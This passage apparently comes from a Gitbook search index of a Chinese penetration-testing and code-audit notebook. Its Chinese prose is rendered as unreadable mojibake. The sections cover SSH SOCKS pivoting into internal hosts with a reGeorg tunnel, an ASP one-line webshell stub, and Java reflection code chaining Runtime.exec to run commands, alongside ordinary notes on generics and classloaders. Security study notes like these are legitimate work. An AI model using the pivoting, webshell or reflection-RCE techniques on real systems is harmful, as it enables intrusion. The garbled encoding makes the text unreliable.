é€‰é¡¹æŒ‡å®šåœ¨æœ¬åœ°ç›‘å¬1080ç«¯å£ï¼Œå¹¶å°†æµé‡é€šè¿‡SSHé€šé“è½¬å‘ã€‚ åœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ªSSHåŠ¨æ€ç«¯å£è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰ï¼Œå°†æœ¬åœ°çš„1080ç«¯å£è®¾ç½®ä¸ºSOCKSä»£ç†æœåŠ¡ã€‚é€šè¿‡è¿™ä¸ªä»£ç†ï¼Œå¯ä»¥å°†æœ¬åœ°çš„ç½‘ç»œæµé‡é€šè¿‡SSHåŠ å¯†é€šé“è½¬å‘åˆ°è¿œç¨‹ä¸»æœºBä¸Šï¼Œä»è€Œè®¿é—®å†…ç½‘ä¸»æœºC å…¨å±€ä»£ç†æµé‡ Linuxï¼šProxychinas Windowsï¼šProxifier é‡åˆ°çš„é—®é¢˜ reGeorgä¸Šä¼ çš„tunnelæ— æ³•è§£æ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 17:07:38 "},"03.ä»£ç å®¡è®¡/.Net/.netæ¸—é€.html":{"url":"03.ä»£ç å®¡è®¡/.Net/.netæ¸—é€.html","title":".netæ¸—é€","keywords":"","body":".net WEB ASPä¸€å¥è¯æœ¨é©¬ z=execute(\"response.clear:response.write(\"\"right\"\"):response.end\") viewstateååºåˆ—åŒ– Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-10-19 11:23:37 "},"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaåå°„.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaåå°„.html","title":"Javaåå°„","keywords":"","body":"åå°„ æ¦‚å¿µ åå°„æ˜¯Javaçš„ç‰¹å¾ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯JVMåœ¨è¿è¡ŒçŠ¶æ€çš„æ—¶å€™æ‰åŠ¨æ€åŠ è½½ç±»ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚é€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚ ç±»åŠ è½½æµç¨‹å¦‚ä¸‹ JVMåœ¨ç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§classç±»å‹æ—¶ï¼Œå°†å…¶åŠ è½½è¿›å†…å­˜åä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªClassç±»å‹çš„å®ä¾‹ï¼Œå¹¶åœ¨è¯¥å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€åŒ…åã€çˆ¶ç±»ã€å®ç°çš„æ¥å£ã€æ‰€æœ‰æ–¹æ³•ã€å­—æ®µç­‰ï¼Œå› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯ã€‚ ç›¸å…³ç±» java.lang.Class //ç±»å¯¹è±¡ java.lang.reflect.Constructor //ç±»çš„æ„é€ å™¨å¯¹è±¡ java.lang.reflect.Field //ç±»çš„å±æ€§å¯¹è±¡ java.lang.reflect.Method //ç±»çš„æ–¹æ³•å¯¹è±¡ java.lang.reflect.Modifier //ç±»çš„ä¿®é¥°ç¬¦å¯¹è±¡ ä½¿ç”¨ Classç±»å‹å®é™…ä¸Šæ˜¯ä¸€ä¸ªåå«Classçš„class public final class Class { private Class() {} } å¯ä»¥çœ‹å‡ºClassç±»çš„æ„é€ å™¨æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥åªæœ‰JVMèƒ½å¤Ÿåˆ›å»ºClasså¯¹è±¡ã€‚ å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨å°±éœ€è¦ä»¥ä¸‹å‡ ç§æ–¹æ³•è·å¾—ï¼š è·å¾—Classç±» //è°ƒç”¨Classç±»çš„é™æ€æ–¹æ³•forNameè·å–æŸä¸ªç±»çš„Classç±»å®ä¾‹ Class clz = Class.forName(\"User\"); æ³¨ï¼šç±»åé»˜è®¤ä¸ºç±»å®Œæ•´ï¤·å¾„,å¦‚java.lang.Runtime,é€šå¸¸ä½¿ç”¨è¿™ä¸ªæ¥è·å¾—Classç±»å®ä¾‹ //è°ƒç”¨æŸä¸ªç±»å®ä¾‹çš„getClass()æ–¹æ³• Class clz = (new User()).getClass(); //è®¿é—®æŸä¸ªç±»å®ä¾‹çš„classå±æ€§ï¼Œè¿™ä¸ªå±æ€§å°±å­˜å‚¨ç€è¿™ä¸ªç±»å¯¹åº”çš„Classç±»çš„å®ä¾‹ Class clz = (new User()).class; è·å¾—æ„é€ å‡½æ•° Constructor[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•° Constructor[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•° Constructor<> getConstructor(ç±»... parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•° Constructor<> getDeclaredConstructor(ç±»... parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•° å®ä¾‹åŒ–ç±» clz.newInstance(); å®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¯¥ç±»çš„æ— å‚æ„é€ å‡½æ•° æ‰€ä»¥å‰ææ¡ä»¶ï¼š è¯¥ç±»æœ‰æ— å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”æ˜¯å…¬æœ‰çš„ è·å¾—æˆå‘˜æ–¹æ³• Method method=Class.getMethod(String name, ç±»... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³• Method method=Class.getDeclaredMethod(String name, ç±»... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³• //ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹ Method method=Class.getMethods() //è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³• Method method=Class.getDeclaredMethods() // è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³• ä½¿ç”¨æˆå‘˜æ–¹æ³• method.invoke(ç±»å®ä¾‹, [è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹]); å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»å¯¹è±¡ï¼› å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»ï¼› è·å–æˆå‘˜å˜é‡ Field[] getFields() ï¼šè·å–æ‰€æœ‰ public ä¿®é¥°çš„æˆå‘˜å˜é‡ Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦ Field getField(String name) è·å–æŒ‡å®šåç§°çš„ public ä¿®é¥°çš„æˆå‘˜å˜é‡ Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡ å®ä¾‹ å¸¸ç”¨çš„RCE Runtime.getRuntime().exec(\"calc\"); æ³¨æ„Runtimeè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­£å¸¸åªèƒ½é€šè¿‡å…¬æœ‰çš„æ–¹æ³•Runtime.getRuntime()æ¥è·å–åˆ° Runtime å¯¹è±¡ é€šè¿‡åå°„å®ç°ä¸Šè¿°ä»£ç  import java.lang.reflect.Method; //é¦–å…ˆéœ€è¦è·å¾—Runtimeç±»çš„Classå®ä¾‹ Class clz = Class.forName(\"java.lang.Runtime\"); //è·å¾—Runtimeç±»çš„getRuntimeæ–¹æ³• Method getruntime = clz.getMethod(\"getRuntime\"); //è°ƒç”¨è¯¥æ–¹æ³•è·å¾—Runtimeå¯¹è±¡ Object runtime = getruntime.invoke(clz); //è·å¾—Runtimeç±»çš„execæ–¹æ³• Method exec = clz.getMethod(\"exec\",String.class); //è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå‘½ä»¤ exec.invoke(runtime,\"calc\"); æ•´åˆæˆä¸€å¥ Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")), \"calc.exe\"); å¼ºåˆ¶è®¿é—®ç§æœ‰ï¼Œä¿æŠ¤ setAccessible(true); ä¸Šè¿°å‘½ä»¤æ‰§è¡Œä»£ç å¯ä»¥è½¬ä¸º import java.lang.reflect.Constructor; public class RuntimeTest { public static void main(String[] args) throws Exception { Class c1= Class.forName(\"java.lang.Runtime\"); // è·å¾—æ„é€ å‡½æ•° Constructor m = c1.getDeclaredConstructor(); // è·å¾—è®¿é—®ç§æœ‰æ–¹æ³•å’Œå±æ€§çš„æƒé™ m.setAccessible(true); c1.getMethod(\"exec\", String.class).invoke(m.newInstance(), \"calc\"); } } ä¿®æ”¹finalå­—æ®µ åªæœ‰finalä¿®é¥°ï¼Œå¹¶ä¸”ä¸ºé—´æ¥èµ‹å€¼ï¼Œå¯ä»¥ä¿®æ”¹ å¦‚æœæ˜¯final+staticä¿®é¥°ï¼Œå¹¶ä¸”ä¸ºé—´æ¥èµ‹å€¼ï¼Œéœ€è¦å…ˆå»æ‰finalä¿®é¥°ç¬¦æ‰èƒ½ä¿®æ”¹ // è·å¾—modifiers Field nameModifyField = nameField.getClass().getDeclaredField(\"modifiers\"); // ä¿®æ”¹æƒé™ nameModifyField.setAccessible(true); // å»é™¤finalä¿®é¥°ç¬¦ nameModifyField.setInt(nameField, nameField.getModifiers() & ~Modifier.FINAL); // ä¿®æ”¹Fieldå€¼ nameField.set(m,new StringBuilder(\"Drunkbaby Too Silly\")); // é‡æ–°æ·»åŠ ä¸Šfinalä¿®é¥°ç¬¦ nameModifyField.setInt(nameField, nameField.getModifiers() & ~Modifier.FINAL); Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-09-27 14:36:49 "},"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaæ³›å‹.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaæ³›å‹.html","title":"Javaæ³›å‹","keywords":"","body":"æ³›å‹ java æ³›å‹è¯¦è§£-ç»å¯¹æ˜¯å¯¹æ³›å‹æ–¹æ³•è®²è§£æœ€è¯¦ç»†çš„ï¼Œæ²¡æœ‰ä¹‹ä¸€ - little fat - åšå®¢å›­ (cnblogs.com) ä»‹ç» List stringList = new ArrayList(); // ä½¿ç”¨æ³›å‹ç±»Listï¼Œå¹¶ä¼ å…¥Stringç±»å‹å®å‚ stringList.add(\"Hello\"); stringList.add(\"World\"); String firstElement = stringList.get(0); // è·å–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  å®šä¹‰ä¸€ä¸ªæ³›å‹ç±»Listï¼Œå…¶ä¸­Tä¸ºç±»å‹å½¢å‚ï¼Œè¡¨ç¤ºåˆ—è¡¨ä¸­å…ƒç´ çš„ç±»å‹ã€‚åœ¨ä½¿ç”¨è¯¥æ³›å‹ç±»æ—¶ï¼Œéœ€è¦ä¼ å…¥å…·ä½“çš„ç±»å‹å®å‚ä½œä¸ºç±»å‹å½¢å‚çš„å–å€¼ã€‚ ç±»å‹å½¢å‚æŒ‡çš„æ˜¯åœ¨å®šä¹‰æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•æ—¶ä½¿ç”¨çš„å ä½ç¬¦ç±»å‹ã€‚å®ƒä»¬ç”¨äºå‚æ•°åˆ—è¡¨ã€è¿”å›å€¼ç±»å‹ã€å±€éƒ¨å˜é‡ç­‰ä½ç½®ï¼Œç”¨æ¥è¡¨ç¤ºå…·ä½“çš„æ•°æ®ç±»å‹è¿˜æœªç¡®å®šã€‚é€šå¸¸ä½¿ç”¨å¤§å†™å­—æ¯æ¥è¡¨ç¤ºç±»å‹å½¢å‚ï¼Œä¾‹å¦‚Tã€Eã€Kç­‰ã€‚ ç±»å‹å®å‚æŒ‡çš„æ˜¯åœ¨ä½¿ç”¨æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•æ—¶å®é™…ä¼ å…¥çš„å…·ä½“æ•°æ®ç±»å‹ã€‚å®ƒä»¬ç”¨äºæ›¿æ¢ç±»å‹å½¢å‚ï¼Œä½¿æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•å…·ä½“åŒ–ã€‚ æ³›å‹çš„ä½œç”¨ ä»£ç å¤ç”¨ ç±»å‹å®‰å…¨ï¼Œç¼–è¯‘å™¨ä¼šæ£€æŸ¥ç±»å‹ å¼•å…¥æ³›å‹åï¼Œå®ƒå°†æä¾›ç±»å‹çš„çº¦æŸï¼Œæä¾›ç¼–è¯‘å‰çš„æ£€æŸ¥ï¼š æ³›å‹ç±» //æ­¤å¤„Tå¯ä»¥éšä¾¿å†™ä¸ºä»»æ„æ ‡è¯†ï¼Œå¸¸è§çš„å¦‚ Type Element Key value //åœ¨å®ä¾‹åŒ–æ³›å‹ç±»æ—¶ï¼Œå¿…é¡»æŒ‡å®šTçš„å…·ä½“ç±»å‹ public class Generic{ //keyè¿™ä¸ªæˆå‘˜å˜é‡çš„ç±»å‹ä¸ºT,Tçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š private T key; public Generic(T key) { //æ³›å‹æ„é€ æ–¹æ³•å½¢å‚keyçš„ç±»å‹ä¹Ÿä¸ºTï¼ŒTçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š this.key = key; } public T getKey(){ //æ³›å‹æ–¹æ³•getKeyçš„è¿”å›å€¼ç±»å‹ä¸ºTï¼ŒTçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š return key; } public static void main(String[] args) { //æ³›å‹çš„ç±»å‹å‚æ•°åªèƒ½æ˜¯ç±»ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»ï¼‰ï¼Œä¸èƒ½æ˜¯ç®€å•ç±»å‹ //ä¼ å…¥çš„å®å‚ç±»å‹éœ€ä¸æ³›å‹çš„ç±»å‹å‚æ•°ç±»å‹ç›¸åŒï¼Œå³ä¸ºInteger. Generic genericInteger = new Generic(123456); //ä¼ å…¥çš„å®å‚ç±»å‹éœ€ä¸æ³›å‹çš„ç±»å‹å‚æ•°ç±»å‹ç›¸åŒï¼Œå³ä¸ºString. Generic genericString = new Generic(\"key_vlaue\"); System.out.println(\"æ³›å‹æµ‹è¯• key is \" + genericInteger.getKey()); System.out.println(\"æ³›å‹æµ‹è¯• key is \" + genericString.getKey()); } } æ³›å‹æ¥å£ //å®šä¹‰ä¸€ä¸ªæ³›å‹æ¥å£ public interface Generator { public T next(); } /** * ä¼ å…¥æ³›å‹å®å‚æ—¶ï¼š * å®šä¹‰ä¸€ä¸ªç”Ÿäº§å™¨å®ç°è¿™ä¸ªæ¥å£,è™½ç„¶æˆ‘ä»¬åªåˆ›å»ºäº†ä¸€ä¸ªæ³›å‹æ¥å£Generator * ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¸ºTä¼ å…¥æ— æ•°ä¸ªå®å‚ï¼Œå½¢æˆæ— æ•°ç§ç±»å‹çš„Generatoræ¥å£ã€‚ * åœ¨å®ç°ç±»å®ç°æ³›å‹æ¥å£æ—¶ï¼Œå¦‚å·²å°†æ³›å‹ç±»å‹ä¼ å…¥å®å‚ç±»å‹ï¼Œåˆ™æ‰€æœ‰ä½¿ç”¨æ³›å‹çš„åœ°æ–¹éƒ½è¦æ›¿æ¢æˆä¼ å…¥çš„å®å‚ç±»å‹ * å³ï¼šGeneratorï¼Œpublic T next();ä¸­çš„çš„Téƒ½è¦æ›¿æ¢æˆä¼ å…¥çš„Stringç±»å‹ã€‚ */ public class FruitGenerator implements Generator { private String[] fruits = new String[]{\"Apple\", \"Banana\", \"Pear\"}; @Override public String next() { Random rand = new Random(); return fruits[rand.nextInt(3)]; } } æ³›å‹é€šé…ç¬¦ Ingeteræ˜¯Numberçš„ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯Genericä¸èƒ½è¢«çœ‹ä½œä¸ºGenericçš„å­ç±»ã€‚ ç”±æ­¤å¯ä»¥çœ‹å‡º:åŒä¸€ç§æ³›å‹å¯ä»¥å¯¹åº”å¤šä¸ªç‰ˆæœ¬ï¼ˆå› ä¸ºå‚æ•°ç±»å‹æ˜¯ä¸ç¡®å®šçš„ï¼‰ï¼Œä¸åŒç‰ˆæœ¬çš„æ³›å‹ç±»å®ä¾‹æ˜¯ä¸å…¼å®¹çš„ã€‚ å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ¨é€»è¾‘ä¸Šå¯ä»¥è¡¨ç¤ºåŒæ—¶æ˜¯Genericå’ŒGenericçˆ¶ç±»çš„å¼•ç”¨ç±»å‹ã€‚ç”±æ­¤ç±»å‹é€šé…ç¬¦?åº”è¿è€Œç”Ÿã€‚ ç±»å‹é€šé…ç¬¦ä¸€èˆ¬æ˜¯ä½¿ç”¨ï¼Ÿä»£æ›¿å…·ä½“çš„ç±»å‹å®å‚ï¼Œæ­¤å¤„çš„ï¼Ÿå’ŒNumberã€Stringã€Integerä¸€æ ·éƒ½æ˜¯ä¸€ç§å®é™…çš„ç±»å‹ï¼Œå¯ä»¥æŠŠï¼Ÿçœ‹æˆæ‰€æœ‰ç±»å‹çš„çˆ¶ç±»ã€‚æ˜¯ä¸€ç§çœŸå®çš„ç±»å‹ã€‚ æ³›å‹æ–¹æ³• æ³›å‹ç±»ä¸­çš„ä½¿ç”¨äº†æ³›å‹çš„æˆå‘˜æ–¹æ³•å¹¶ä¸æ˜¯æ³›å‹æ–¹æ³• public class Generic{ public Generic(T key) { this.key = key; } } è¯¥æ³›å‹ç±»çš„æ„é€ æ–¹æ³•å½¢å‚keyçš„ç±»å‹ä¹Ÿä¸ºTï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯æ³›å‹æ–¹æ³•ï¼Œåªæ˜¯ç±»ä¸­ä¸€ä¸ªæ™®é€šçš„æˆå‘˜æ–¹æ³•ã€‚å› ä¸ºè¯¥æ–¹æ³•èƒ½ä½¿ç”¨Tæ˜¯å› ä¸ºåœ¨å£°æ˜æ³›å‹ç±»æ—¶Tå·²ç»è¢«æŒ‡å®šäº†ã€‚ å¦‚æœè¯¥æ–¹æ³•ä½¿ç”¨äº†æ³›å‹ç±»æ²¡æœ‰å£°æ˜çš„æ³›å‹Eï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™ åªæœ‰å£°æ˜äº†<>çš„æ–¹æ³•æ‰æ˜¯æ³›å‹æ–¹æ³• public class Generic{ public T getKey(){ return key; } } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-09-27 14:35:27 "},"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaç±»åŠ è½½å™¨.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/01.åŸºç¡€çŸ¥è¯†/Javaç±»åŠ è½½å™¨.html","title":"Javaç±»åŠ è½½å™¨","keywords":"","body":" è½¬è½½è‡ªJAVAå®‰å…¨åŸºç¡€ï¼ˆä¸€ï¼‰--ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) 0x01 æ¦‚å¿µ Javaç±»åŠ è½½å™¨(Java Classloader)æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒ(Java Runtime Environment)çš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£åŠ¨æ€åŠ è½½Javaç±»åˆ°Javaè™šæ‹Ÿæœºçš„å†…å­˜ç©ºé—´ä¸­ï¼Œç”¨äºåŠ è½½ç³»ç»Ÿã€ç½‘ç»œæˆ–è€…å…¶ä»–æ¥æºçš„ç±»æ–‡ä»¶ã€‚Javaæºä»£ç é€šè¿‡javacç¼–è¯‘å™¨ç¼–è¯‘æˆç±»æ–‡ä»¶ï¼Œç„¶åJVMæ¥æ‰§è¡Œç±»æ–‡ä»¶ä¸­çš„å­—èŠ‚ç æ¥æ‰§è¡Œç¨‹åºã€‚ 0x02 Javaç±»è¿è¡Œ ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»å…ˆè½¬æ¢ä¸ºç±»å­—èŠ‚ç ç„¶åç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶ï¼ˆç±»å­—èŠ‚ç ï¼‰çš„åŠ è½½ 0x03 åº”ç”¨åœºæ™¯ 1ã€èµ„æºéš”ç¦» å®ç°ä¸åŒé¡¹ç›®æˆ–è€…åŒä¸€ä¸ªé¡¹ç›®ä¸Šçš„ä¸åŒç‰ˆæœ¬çš„jaråŒ…éš”ç¦»ï¼Œé¿å…é›†ç¾¤é”™è¯¯æˆ–è€…å†²çªçš„äº§ç”Ÿã€‚ 2ã€çƒ­éƒ¨ç½² å¯¹äºJavaåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œçƒ­éƒ¨ç½²å°±æ˜¯åœ¨è¿è¡Œæ—¶æ›´æ–°Javaç±»æ–‡ä»¶ã€‚åœ¨åŸºäºJavaçš„åº”ç”¨æœåŠ¡å™¨å®ç°çƒ­éƒ¨ç½²çš„è¿‡ç¨‹ä¸­ï¼Œç±»è£…å…¥å™¨æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚ç±»è£…å…¥å™¨ä¸èƒ½é‡æ–°è£…å…¥ä¸€ä¸ªå·²ç»è£…å…¥çš„ç±»ï¼Œä½†åªè¦ä½¿ç”¨ä¸€ä¸ªæ–°çš„ç±»è£…å…¥å™¨å®ä¾‹ï¼Œå°±å¯ä»¥å°†ç±»å†æ¬¡è£…å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚è¿™æ ·æˆ‘ä»¬åº”ç”¨æ­£åœ¨è¿è¡Œçš„æ—¶å€™å‡çº§è½¯ä»¶ï¼Œå´ä¸éœ€è¦é‡æ–°å¯åŠ¨åº”ç”¨ã€‚ 3ã€ä»£ç ä¿æŠ¤ æˆ‘ä»¬å¯ä»¥å¯¹å­—èŠ‚ç æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå†ä½¿ç”¨ç‰¹å®šçš„ClassLoaderè§£å¯†æ–‡ä»¶å†…å®¹ï¼Œå†åŠ è½½è¿™äº›å­—èŠ‚ç æ–‡ä»¶ã€‚è¿™æ ·å°±èƒ½å¤Ÿå®ç°å¯¹æˆ‘ä»¬çš„ä»£ç é¡¹ç›®åŠ å¯†ä¿æŠ¤ï¼Œåˆ«äººæ— æ³•è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹æºä»£ç ä¿¡æ¯ã€‚ 0x04 åŒäº²å§”æ´¾ Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰ å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)ï¼Œåº•å±‚åŸç”Ÿä»£ç æ˜¯C++è¯­è¨€ç¼–å†™ï¼Œå±äºjvmä¸€éƒ¨åˆ†ï¼Œä¸ç»§æ‰¿java.lang.ClassLoaderç±»ï¼Œä¹Ÿæ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¸»è¦è´Ÿè´£åŠ è½½æ ¸å¿ƒjavaåº“(å³JVMæœ¬èº«)ï¼Œå­˜å‚¨åœ¨/jre/lib/rt.jarç›®å½•å½“ä¸­ Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)ç”¨æ¥åœ¨/jre/lib/extæˆ–è€…java.ext.dirsä¸­æŒ‡æ˜çš„ç›®å½•åŠ è½½javaçš„æ‰©å±•åº“ã€‚Javaè™šæ‹Ÿæœºä¼šæä¾›ä¸€ä¸ªæ‰©å±•åº“ç›®å½•ï¼Œæ­¤åŠ è½½å™¨åœ¨ç›®å½•é‡Œé¢æŸ¥æ‰¾å¹¶åŠ è½½javaç±»ã€‚ App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆApp ClassLoaderï¼‰ä¸€èˆ¬é€šè¿‡é€šè¿‡(java.class.pathæˆ–è€…Classpathç¯å¢ƒå˜é‡)æ¥åŠ è½½Javaç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„classpathè·¯å¾„ã€‚ AppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨AppClassLoaderåŠ è½½ è·å¾—ç±»å¯¹è±¡çš„ç±»åŠ è½½å™¨ xxx.class.getClassLoader() å¦‚ä¸Šå›¾ç±»åŠ è½½å™¨å±‚æ¬¡å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç§°ä¸ºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œä»–ä»¬ä¹‹é—´å¹¶ä¸æ˜¯\"ç»§æ‰¿\"ä½“ç³»ï¼Œè€Œæ˜¯å§”æ´¾ä½“ç³»ã€‚å½“ä¸Šè¿°ç‰¹å®šçš„ç±»åŠ è½½å™¨æ¥åˆ°åŠ è½½ç±»çš„è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šå…ˆå°†ä»»åŠ¡å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œæ¥ç€è¯·æ±‚çˆ¶ç±»åŠ è½½è¿™ä¸ªç±»ï¼Œå½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½æ—¶ï¼ˆå…¶ç›®å½•æœç´ èŒƒå›´æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€è¦çš„ç±»æ—¶ï¼‰ï¼Œå­ç±»åŠ è½½å™¨æ‰ä¼šè¿›è¡ŒåŠ è½½ä½¿ç”¨ã€‚è¿™æ ·å¯ä»¥é¿å…æœ‰äº›ç±»è¢«é‡å¤åŠ è½½ã€‚ åŒäº²å§”æ´¾å¥½å¤„ 1ã€è¿™æ ·å°±æ˜¯èƒ½å¤Ÿå®ç°æœ‰äº›ç±»é¿å…é‡å¤åŠ è½½ä½¿ç”¨ï¼Œç›´æ¥å…ˆç»™çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œä¸ç”¨å­åŠ è½½å™¨å†æ¬¡é‡å¤åŠ è½½ã€‚ 2ã€ä¿è¯javaæ ¸å¿ƒåº“çš„ç±»å‹å®‰å…¨ã€‚æ¯”å¦‚ç½‘ç»œä¸Šä¼ 